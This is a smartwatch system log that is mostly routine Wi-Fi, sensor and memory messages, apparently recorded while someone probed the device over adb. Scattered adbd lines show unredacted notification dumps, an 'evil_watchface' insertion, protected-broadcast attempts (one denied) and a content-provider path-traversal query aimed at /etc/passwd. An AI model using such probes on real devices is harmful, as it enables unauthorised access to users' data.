06-30 03:18:57.574  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:18:57.574  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:19:00.622  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:19:00.623  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:19:00.631  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:19:00.635  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:19:00.636  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:19:00.638  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:19:00.638  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:19:00.639  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:19:00.640  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:19:00.643  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:19:00.903   855   880 D ContextHubHal: Got message from nanoapp: ID 0x476f6f676c003000
06-30 03:19:01.055  1435  1435 E BatteryDefender: Failed to read /sys/devices/platform/google,charger/bd_state
06-30 03:19:01.072  1435  1435 E BatteryDefender: Failed to read /sys/devices/platform/google,charger/bd_state
06-30 03:19:01.186   721   859 D MCU     : calories_consumer.cc:157         16:33:49.736 Calories OnSample timestamp_ns=57945807678222 total=1.05
06-30 03:19:01.186   721   859 D MCU     : offload_data_provider_app.cc:1190 16:33:49.737 [OffloadDataProvider] Got Calories, total=289.80
06-30 03:19:01.749   391   416 E pixelstats-uevent: Unable to read  - No such file or directory
06-30 03:19:03.676  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:19:03.678  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:19:03.678  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:19:03.682  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:19:03.684  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:19:03.685  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:19:03.686  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:19:03.686  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:19:03.689  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:19:03.691  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:19:06.710  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:19:09.745  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:19:09.746  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:19:09.750  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:19:09.753  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:19:09.754  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:19:09.756  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:19:09.757  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:19:09.761  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:19:09.762  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:19:09.763  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:19:10.691   721   859 D MCU     : usf_sensor.cc:1920               16:33:59.462 [USF] Received start sampling request for Skin temperature sensor (active:1).
06-30 03:19:10.692   721   859 D MCU     : device.cc:154                    16:33:59.463 AS6221Device Set conversion timer: 60000000 ns
06-30 03:19:10.692   721   859 D MCU     : device.cc:173                    16:33:59.463 AS6221Device Set sampling timer:180000000
06-30 03:19:10.692   721   859 D MCU     : skin_temperature_manager.cc:333  16:33:59.526 [SkinTemperature] [Record Processing Incomplete] Processed 0 temperature samples.
06-30 03:19:12.811  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:19:14.129   391   416 E pixelstats-uevent: Unable to read  - No such file or directory
06-30 03:19:14.140  1435  1435 E BatteryDefender: Failed to read /sys/devices/platform/google,charger/bd_state
06-30 03:19:14.148  1435  1435 E BatteryDefender: Failed to read /sys/devices/platform/google,charger/bd_state
06-30 03:19:15.862  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:19:16.395   855   880 D ContextHubHal: Got message from nanoapp: ID 0x476f6f676c003000
06-30 03:19:16.694   721   859 D MCU     : site_data_provider.cc:220        16:34:05.713 [SiteDataProvider] Flushing 1 GROK records
06-30 03:19:16.695   721   859 D MCU     : site_data_provider.cc:220        16:34:05.713 [SiteDataProvider] Flushing 1 GROK records
06-30 03:19:16.845   391   416 E pixelstats-uevent: Unable to read  - No such file or directory
06-30 03:19:18.902  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:19:21.271   857   857 E ODPM    : readEnergyMeter()
06-30 03:19:21.947  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:19:25.002  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:19:25.003  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:19:25.006  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:19:25.012  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:19:25.012  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:19:25.012  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:19:25.014  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:19:25.014  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:19:25.018  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:19:25.018  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:19:26.128  1719  1901 I SensorService: Setting connection 0xe47359c0 disabled status to 0 for reason 2
06-30 03:19:26.132  1719  1760 D ActivityManager: sync unfroze 8905 com.fitbit.FitbitMobile for 3
06-30 03:19:27.059  1226  1226 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color,raw:dumpsys notification --noredact'
06-30 03:19:27.126  1719  3326 I PackageManager: getInstalledPackages: callingUid=1000 flags=4096 updatedFlags=790528 userId=0
06-30 03:19:27.357  1719  1736 I system_server: Background young concurrent mark compact GC freed 5512KB AllocSpace bytes, 1(20KB) LOS objects, 87% free, 31MB/256MB, paused 4.127ms,6.827ms total 114.527ms
06-30 03:19:27.738  1226  1226 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color,raw:dumpsys activity services'
06-30 03:19:27.851  1226  1226 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color,raw:content insert --uri content://com.google.wear.services.watchface.provider/instances --bind name:s:evil_watchface'
06-30 03:19:28.032  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:19:28.287 20634 20634 D AndroidRuntime: >>>>>> START com.android.internal.os.RuntimeInit uid 2000 <<<<<<
06-30 03:19:28.305 20634 20634 I AndroidRuntime: Using default boot image
06-30 03:19:28.305 20634 20634 I AndroidRuntime: Leaving lock profiling enabled
06-30 03:19:28.320 20634 20634 I app_process: Core platform API enforcement enabled from the hiddenapi_platform_enforcement flag and the device API level
06-30 03:19:28.324 20634 20634 I app_process: Using generational CollectorTypeCMC GC.
06-30 03:19:28.553 20634 20634 W app_process: Bump pointer space is not aligned to 2048KB. This can lead to longer stop-the-world pauses for compaction
06-30 03:19:28.606 20634 20634 D nativeloader: InitDefaultPublicLibraries for_preload=1: libandroid.so:libaaudio.so:libamidi.so:libbinder_ndk.so:libc.so:libcamera2ndk.so:libdl.so:libEGL.so:libGLESv1_CM.so:libGLESv2.so:libGLESv3.so:libicu.so:libicui18n.so:libicuuc.so:libjnigraphics.so:liblog.so:libmediandk.so:libm.so:libnativehelper.so:libnativewindow.so:libneuralnetworks.so:libOpenMAXAL.so:libOpenSLES.so:libRS.so:libstdc++.so:libsync.so:libvulkan.so:libz.so
06-30 03:19:28.651 20634 20634 D nativeloader: Load libicu_jni.so using APEX ns com_android_art for caller /apex/com.android.art/javalib/core-oj.jar: ok
06-30 03:19:28.651 20634 20634 D app_process: u_setTimeZoneFilesDirectory("/apex/com.android.tzdata/etc/tz/versioned/10/icu") succeeded. 
06-30 03:19:28.652 20634 20634 D app_process: I18n APEX ICU file found: /apex/com.android.i18n/etc/icu/icudt78l.dat
06-30 03:19:28.654 20634 20634 D nativeloader: Load libjavacore.so using APEX ns com_android_art for caller /apex/com.android.art/javalib/core-oj.jar: ok
06-30 03:19:28.658 20634 20634 D nativeloader: Load libopenjdk.so using APEX ns com_android_art for caller /apex/com.android.art/javalib/core-oj.jar: ok
06-30 03:19:28.662 20634 20634 I app_process: Priority-to-niceness mapping: 19, 16, 13, 10, 0, -2, -4, -5, -6, -8
06-30 03:19:28.776 20634 20634 D nativeloader: Load libframework-connectivity-tiramisu-jni.so using APEX ns com_android_tethering for caller /apex/com.android.tethering/javalib/framework-connectivity-t.jar: ok
06-30 03:19:28.777 20634 20634 D AndroidRuntime: Calling main entry com.android.commands.content.Content
06-30 03:19:28.789 20634 20634 I AconfigPackage: com.android.os.statsd.flags is mapped to com.android.os.statsd
06-30 03:19:28.790 20634 20634 I AconfigPackage: com.android.uprobestats.flags is mapped to com.android.uprobestats
06-30 03:19:28.790 20634 20634 I AconfigPackage: android.uprobestats.mainline.flags is mapped to com.android.uprobestats
06-30 03:19:28.791 20634 20634 I AconfigPackage: com.android.media.extractor.flags is mapped to com.android.media
06-30 03:19:28.791 20634 20634 I AconfigPackage: com.android.media.metrics.flags is mapped to com.android.media
06-30 03:19:28.792 20634 20634 I AconfigPackage: com.android.media.mainline.flags is mapped to com.android.media
06-30 03:19:28.793 20634 20634 I AconfigPackage: com.android.adservices.flags is mapped to com.android.adservices
06-30 03:19:28.793 20634 20634 I AconfigPackage: com.android.sdksandbox.flags is mapped to com.android.adservices
06-30 03:19:28.793 20634 20634 I AconfigPackage: android.app.sdksandbox.flags is mapped to com.android.adservices
06-30 03:19:28.794 20634 20634 I AconfigPackage: com.android.npumanager is mapped to com.android.npumanager
06-30 03:19:28.795 20634 20634 I AconfigPackage: com.android.appsearch.flags is mapped to com.android.appsearch
06-30 03:19:28.795 20634 20634 I AconfigPackage: com.android.crashrecovery.flags is mapped to com.android.crashrecovery
06-30 03:19:28.796 20634 20634 I AconfigPackage: com.android.tethering.mainline.beta is mapped to com.android.tethering
06-30 03:19:28.796 20634 20634 I AconfigPackage: android.net.http is mapped to com.android.tethering
06-30 03:19:28.797 20634 20634 I AconfigPackage: com.android.tethering.readonly.flags is mapped to com.android.tethering
06-30 03:19:28.797 20634 20634 I AconfigPackage: android.net.vcn is mapped to com.android.tethering
06-30 03:19:28.797 20634 20634 I AconfigPackage: com.android.net.flags is mapped to com.android.tethering
06-30 03:19:28.797 20634 20634 I AconfigPackage: com.android.tethering.flags is mapped to com.android.tethering
06-30 03:19:28.797 20634 20634 I AconfigPackage: com.android.tethering.beta.test is mapped to com.android.tethering
06-30 03:19:28.797 20634 20634 I AconfigPackage: com.android.nearby.flags is mapped to com.android.tethering
06-30 03:19:28.797 20634 20634 I AconfigPackage: com.android.net.thread.flags is mapped to com.android.tethering
06-30 03:19:28.797 20634 20634 I AconfigPackage: com.android.net.ct.flags is mapped to com.android.tethering
06-30 03:19:28.798 20634 20634 I AconfigPackage: com.android.nfc.module.flags is mapped to com.android.nfcservices
06-30 03:19:28.798 20634 20634 I AconfigPackage: com.android.nfc.module.nonexported.flags is mapped to com.android.nfcservices
06-30 03:19:28.798 20634 20634 I AconfigPackage: com.android.uwb.flags is mapped to com.android.uwb
06-30 03:19:28.798 20634 20634 I AconfigPackage: com.android.ranging.flags is mapped to com.android.uwb
06-30 03:19:28.799 20634 20634 I AconfigPackage: com.android.rkpd.flags is mapped to com.android.rkpd
06-30 03:19:28.799 20634 20634 I AconfigPackage: com.android.system.virtualmachine.flags is mapped to com.android.virt
06-30 03:19:28.800 20634 20634 I AconfigPackage: com.android.org.conscrypt.flags is mapped to com.android.conscrypt
06-30 03:19:28.800 20634 20634 I AconfigPackage: com.android.org.conscrypt.net.flags is mapped to com.android.conscrypt
06-30 03:19:28.801 20634 20634 I AconfigPackage: android.media.swcodec.flags is mapped to com.android.media.swcodec
06-30 03:19:28.802 20634 20634 I AconfigPackage: com.android.ipsec.flags is mapped to com.android.ipsec
06-30 03:19:28.803 20634 20634 I AconfigPackage: com.android.cellbroadcastreceiver.flags is mapped to com.android.cellbroadcast
06-30 03:19:28.803 20634 20634 I AconfigPackage: android.telecom.flags is mapped to com.android.telephonycore
06-30 03:19:28.803 20634 20634 I AconfigPackage: com.android.internal.telecom.flags is mapped to com.android.telephonycore
06-30 03:19:28.804 20634 20634 I AconfigPackage: com.android.telephony.flags is mapped to com.android.telephonycore
06-30 03:19:28.804 20634 20634 I AconfigPackage: com.android.devicelock.flags is mapped to com.android.devicelock
06-30 03:19:28.805 20634 20634 I AconfigPackage: com.android.permission.flags is mapped to com.android.permission
06-30 03:19:28.805 20634 20634 I AconfigPackage: com.android.permissioncontroller.flags is mapped to com.android.permission
06-30 03:19:28.806 20634 20634 I AconfigPackage: com.android.icu is mapped to com.android.i18n
06-30 03:19:28.807 20634 20634 I AconfigPackage: com.android.adservices.ondevicepersonalization.flags is mapped to com.android.ondevicepersonalization
06-30 03:19:28.808 20634 20634 I AconfigPackage: com.android.wifi.flags is mapped to com.android.wifi
06-30 03:19:28.809 20634 20634 I AconfigPackage: com.android.webapp.flags is mapped to com.android.webapp
06-30 03:19:28.810 20634 20634 I AconfigPackage: android.os.profiling is mapped to com.android.profiling
06-30 03:19:28.810 20634 20634 I AconfigPackage: android.os.profiling.anomaly.flags is mapped to com.android.profiling
06-30 03:19:28.811 20634 20634 I AconfigPackage: com.android.healthfitness.flags is mapped to com.android.healthfitness
06-30 03:19:28.812 20634 20634 I AconfigPackage: com.android.art.flags is mapped to com.android.art
06-30 03:19:28.812 20634 20634 I AconfigPackage: com.android.art.rw.flags is mapped to com.android.art
06-30 03:19:28.812 20634 20634 I AconfigPackage: com.android.libcore is mapped to com.android.art
06-30 03:19:28.813 20634 20634 I AconfigPackage: android.provider.flags is mapped to com.android.configinfrastructure
06-30 03:19:28.813 20634 20634 I AconfigPackage: com.android.server.deviceconfig is mapped to com.android.configinfrastructure
06-30 03:19:28.814 20634 20634 I AconfigPackage: com.google.android.widevine.flags is mapped to com.google.android.widevine
06-30 03:19:28.815 20634 20634 I AconfigPackage: com.android.adbd.flags is mapped to com.android.adbd
06-30 03:19:28.815 20634 20634 I AconfigPackage: android.graphics.pdf.flags is mapped to com.android.mediaprovider
06-30 03:19:28.815 20634 20634 I AconfigPackage: com.android.providers.media.flags is mapped to com.android.mediaprovider
06-30 03:19:28.816 20634 20634 I AconfigPackage: android.graphics.pdf.flags.readonly is mapped to com.android.mediaprovider
06-30 03:19:28.816 20634 20634 I AconfigPackage: com.android.bluetooth.beta.flags is mapped to com.android.bt
06-30 03:19:28.816 20634 20634 I AconfigPackage: com.android.bluetooth.flags is mapped to com.android.bt
06-30 03:19:28.817 20634 20634 E FeatureFlagsImplExport: android.os.flagging.AconfigStorageReadException: ERROR_PACKAGE_NOT_FOUND: package android.xr cannot be found on the device
06-30 03:19:28.837 20634 20634 D AndroidRuntime: Shutting down VM
06-30 03:19:28.837 20634 20644 W libbinder.IPCThreadState: call to talkWithDriver in joinThreadPool returned error: -9 (Bad file descriptor), FD: -1
06-30 03:19:28.837 20634 20643 W libbinder.IPCThreadState: call to talkWithDriver in joinThreadPool returned error: -9 (Bad file descriptor), FD: -1
06-30 03:19:29.731  1226  1226 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color,raw:am broadcast -a com.google.android.clockwork.settings.END_WET_MODE'
06-30 03:19:29.820  1719  3326 I ActivityManager: Broadcasting: Intent { act=com.google.android.clockwork.settings.END_WET_MODE flg=0x400000 }
06-30 03:19:29.821  1719  1746 I ActivityManager: Broadcast completed: result=0
06-30 03:19:29.821  1719  3326 I ActivityManager: Enqueued broadcast Intent { act=com.google.android.clockwork.settings.END_WET_MODE flg=0x400000 }: 0
06-30 03:19:29.843  1226  1226 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color,raw:am broadcast -a com.google.android.clockwork.home.REMOTE_ACTION_SUCCESS --ei message_id 1 --es intent_id test'
06-30 03:19:29.933  1719  3326 I ActivityManager: Broadcasting: Intent { act=com.google.android.clockwork.home.REMOTE_ACTION_SUCCESS flg=0x400000 (has extras) }
06-30 03:19:29.935  1719  3326 I ActivityManager: Enqueued broadcast Intent { act=com.google.android.clockwork.home.REMOTE_ACTION_SUCCESS flg=0x400000 (has extras) }: 0
06-30 03:19:29.935  1719  1746 I ActivityManager: Broadcast completed: result=0
06-30 03:19:31.080  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:19:31.285  1719  1974 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET, states=14
06-30 03:19:31.286  1719  1974 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET6, states=14
06-30 03:19:31.287  1719  1974 D InetDiagMessage: Destroyed live tcp sockets for uids={10111} in 4ms
06-30 03:19:31.288  1719  1974 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET, states=14
06-30 03:19:31.290  1719  1974 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET6, states=14
06-30 03:19:31.291  1719  1974 D InetDiagMessage: Destroyed live tcp sockets for uids={20111} in 4ms
06-30 03:19:31.295  1719  1914 D ActivityManager: freezing 8905 com.fitbit.FitbitMobile
06-30 03:19:31.297  1719  1901 I SensorService: Setting connection 0xe47359c0 disabled status to 1 for reason 2
06-30 03:19:31.303  1719  1974 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET, states=14
06-30 03:19:31.305  1719  1974 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET6, states=14
06-30 03:19:31.305  1719  1974 D InetDiagMessage: Destroyed live tcp sockets for uids={10111} in 3ms
06-30 03:19:31.753   391   416 E pixelstats-uevent: Unable to read  - No such file or directory
06-30 03:19:34.122  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:19:34.123  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:19:34.129  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:19:34.131  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:19:34.132  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:19:34.136  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:19:34.137  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:19:34.138  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:19:34.138  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:19:34.144  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:19:37.195  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:19:37.195  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:19:37.196  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:19:37.203  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:19:37.203  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:19:37.203  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:19:37.205  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:19:37.205  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:19:37.208  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:19:37.209  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:19:37.563   391   416 E pixelstats-uevent: Unable to read  - No such file or directory
06-30 03:19:37.572  1435  1435 E BatteryDefender: Failed to read /sys/devices/platform/google,charger/bd_state
06-30 03:19:37.581  1435  1435 E BatteryDefender: Failed to read /sys/devices/platform/google,charger/bd_state
06-30 03:19:40.229  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:19:42.926  1226  1226 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color,raw:am broadcast -a com.google.android.clockwork.action.REQUEST_KEYGUARD_BOUNCER --ez keyguard_auth_only true'
06-30 03:19:43.016  1719  3326 I ActivityManager: Broadcasting: Intent { act=com.google.android.clockwork.action.REQUEST_KEYGUARD_BOUNCER flg=0x400000 (has extras) }
06-30 03:19:43.017  1719  3326 I ActivityManager: Enqueued broadcast Intent { act=com.google.android.clockwork.action.REQUEST_KEYGUARD_BOUNCER flg=0x400000 (has extras) }: 0
06-30 03:19:43.018  1719  1746 I ActivityManager: Broadcast completed: result=0
06-30 03:19:43.046  1226  1226 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color,raw:am broadcast -a com.google.android.clockwork.action.UNPAIRED_BOUNCER_RESULT'
06-30 03:19:43.143  1719  3326 I ActivityManager: Broadcasting: Intent { act=com.google.android.clockwork.action.UNPAIRED_BOUNCER_RESULT flg=0x400000 }
06-30 03:19:43.143  1719  3326 W ActivityManager: Permission Denial: not allowed to send broadcast com.google.android.clockwork.action.UNPAIRED_BOUNCER_RESULT from pid=20662, uid=2000
06-30 03:19:43.290  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:19:44.621  4198  4207 W id.wearable.app: Reducing the number of considered missed Gc histogram windows from 102 to 100
06-30 03:19:46.349  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:19:46.349  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:19:46.349  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:19:46.356  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:19:46.356  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:19:46.357  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:19:46.358  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:19:46.359  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:19:46.362  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:19:46.363  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:19:46.627  2076  2088 I .wearable.sysui: NativeAlloc concurrent mark compact GC freed 636KB AllocSpace bytes, 0(0B) LOS objects, 89% free, 13MB/128MB, paused 1.179ms,5.047ms total 270.756ms
06-30 03:19:46.796   391   416 E pixelstats-uevent: Unable to read  - No such file or directory
06-30 03:19:49.404  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:19:52.464  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:19:54.880  1628  1654 I pixel-thermal: CDEV log 
06-30 03:19:55.531  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:19:55.531  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:19:55.532  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:19:55.538  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:19:55.540  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:19:55.541  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:19:55.541  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:19:55.543  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:19:55.545  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:19:55.546  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:19:58.349  1226  1226 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color,raw:dumpsys activity activities'
06-30 03:19:58.454  1226  1226 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color,raw:am broadcast -a com.android.setupwizard.START_PHONE_SWITCH -p com.google.wear.services'
06-30 03:19:58.543  1719  3059 I ActivityManager: Broadcasting: Intent { act=com.android.setupwizard.START_PHONE_SWITCH flg=0x400000 pkg=com.google.wear.services }
06-30 03:19:58.545  1719  3059 I ActivityManager: Enqueued broadcast Intent { act=com.android.setupwizard.START_PHONE_SWITCH flg=0x400000 pkg=com.google.wear.services }: 0
06-30 03:19:58.545  1719  1746 I ActivityManager: Broadcast completed: result=0
06-30 03:19:58.563  1226  1226 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color,raw:am broadcast -a com.google.wear.services.RETAIN_ESIM -p com.google.wear.services'
06-30 03:19:58.576  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:19:58.576  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:19:58.585  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:19:58.586  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:19:58.588  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:19:58.588  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:19:58.594  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:19:58.595  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:19:58.596  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:19:58.597  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:19:58.648  1719  3058 I ActivityManager: Broadcasting: Intent { act=com.google.wear.services.RETAIN_ESIM flg=0x400000 pkg=com.google.wear.services }
06-30 03:19:58.650  1719  3058 I ActivityManager: Enqueued broadcast Intent { act=com.google.wear.services.RETAIN_ESIM flg=0x400000 pkg=com.google.wear.services }: 0
06-30 03:19:58.650  1719  1746 I ActivityManager: Broadcast completed: result=0
06-30 03:19:58.668  1226  1226 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color,raw:cmd notification list'
06-30 03:19:59.893  1226  1226 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color,raw:content query --uri content://com.google.wear.services.watchface.provider/../../../../etc/passwd'
06-30 03:20:00.323 20684 20684 D AndroidRuntime: >>>>>> START com.android.internal.os.RuntimeInit uid 2000 <<<<<<
06-30 03:20:00.341 20684 20684 I AndroidRuntime: Using default boot image
06-30 03:20:00.341 20684 20684 I AndroidRuntime: Leaving lock profiling enabled
06-30 03:20:00.356 20684 20684 I app_process: Core platform API enforcement enabled from the hiddenapi_platform_enforcement flag and the device API level
06-30 03:20:00.359 20684 20684 I app_process: Using generational CollectorTypeCMC GC.
06-30 03:20:00.588 20684 20684 W app_process: Bump pointer space is not aligned to 2048KB. This can lead to longer stop-the-world pauses for compaction
06-30 03:20:00.643 20684 20684 D nativeloader: InitDefaultPublicLibraries for_preload=1: libandroid.so:libaaudio.so:libamidi.so:libbinder_ndk.so:libc.so:libcamera2ndk.so:libdl.so:libEGL.so:libGLESv1_CM.so:libGLESv2.so:libGLESv3.so:libicu.so:libicui18n.so:libicuuc.so:libjnigraphics.so:liblog.so:libmediandk.so:libm.so:libnativehelper.so:libnativewindow.so:libneuralnetworks.so:libOpenMAXAL.so:libOpenSLES.so:libRS.so:libstdc++.so:libsync.so:libvulkan.so:libz.so
06-30 03:20:00.688 20684 20684 D nativeloader: Load libicu_jni.so using APEX ns com_android_art for caller /apex/com.android.art/javalib/core-oj.jar: ok
06-30 03:20:00.688 20684 20684 D app_process: u_setTimeZoneFilesDirectory("/apex/com.android.tzdata/etc/tz/versioned/10/icu") succeeded. 
06-30 03:20:00.689 20684 20684 D app_process: I18n APEX ICU file found: /apex/com.android.i18n/etc/icu/icudt78l.dat
06-30 03:20:00.692 20684 20684 D nativeloader: Load libjavacore.so using APEX ns com_android_art for caller /apex/com.android.art/javalib/core-oj.jar: ok
